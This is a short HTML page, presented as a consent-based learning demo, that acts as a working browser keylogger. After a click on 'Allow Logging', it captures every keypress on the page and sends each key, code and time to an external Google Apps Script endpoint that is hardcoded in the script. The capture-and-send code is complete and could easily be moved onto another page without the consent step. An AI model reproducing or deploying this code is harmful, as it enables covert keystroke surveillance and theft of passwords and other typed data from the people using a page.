<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Key Logger with Consent</title>
  <style>
    body { font-family: Arial; text-align: center; padding: 40px; }
    #logDisplay { margin-top: 20px; width: 90%; max-width: 600px; height: 200px; overflow-y: auto; background: #f4f4f4; border: 1px solid #ccc; padding: 10px; white-space: pre-wrap; }
    button { font-size: 16px; padding: 10px 20px; margin: 10px; }
  </style>
</head>
<body>

  <h2>🔒 This page records key presses (for learning only)</h2>
  <p>Please click "Allow Logging" to continue.</p>

  <button id="startBtn">✅ Allow Logging</button>
  <div id="logDisplay"></div>

  <script>
    const logDisplay = document.getElementById("logDisplay");
    const startBtn = document.getElementById("startBtn");
    const webAppUrl = "https://script.google.com/macros/s/AKfycbx5xdp58hd1UdJkvMlFwngyvtd9E6YbJbQR4VWCUzH8VTl7ecmOx6uS5UpQ7EvAXulKzg/exec"; // Replace with your real Web App URL

    startBtn.addEventListener("click", () => {
      logDisplay.textContent += "--- Logging started ---\n";
      document.addEventListener("keydown", async (e) => {
        const entry = {
          key: e.key,
          code: e.code,
          time: new Date().toLocaleTimeString()
        };
        logDisplay.textContent += `Key: ${entry.key}, Code: ${entry.code}, Time: ${entry.time}\n`;

        // Send to Google Sheets
        await fetch(webAppUrl, {
          method: "POST",
          body: JSON.stringify(entry),
          headers: {
            "Content-Type": "application/json"
          }
        });
      });
    });
  </script>

</body>
</html>
